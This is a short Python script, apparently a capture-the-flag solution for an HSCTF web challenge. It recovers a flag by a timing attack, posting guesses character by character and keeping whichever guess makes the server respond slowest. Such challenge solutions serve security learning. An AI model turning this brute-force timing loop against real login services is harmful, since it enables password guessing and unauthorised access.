#bruteforce with timing attack problem
#brute-force attack according to the web server response 

import requests, string

url = 'https://networked-password.web.chal.hsctf.com'
charset = string.letters + string.digits + string.punctuation
# print charset
flag = "hsctf{"
resp = 0
char = ""

while flag[-1] != "}":
  for i in charset:
    payload = {"password":flag + i}
    print "[*] Trying: " + flag + i
    r = requests.post(url, data = payload)
    if r.elapsed.total_seconds() > resp:
      resp = r.elapsed.total_seconds()
      char = i
  flag += char
  resp = 0

print "[+] Flag: " + flag
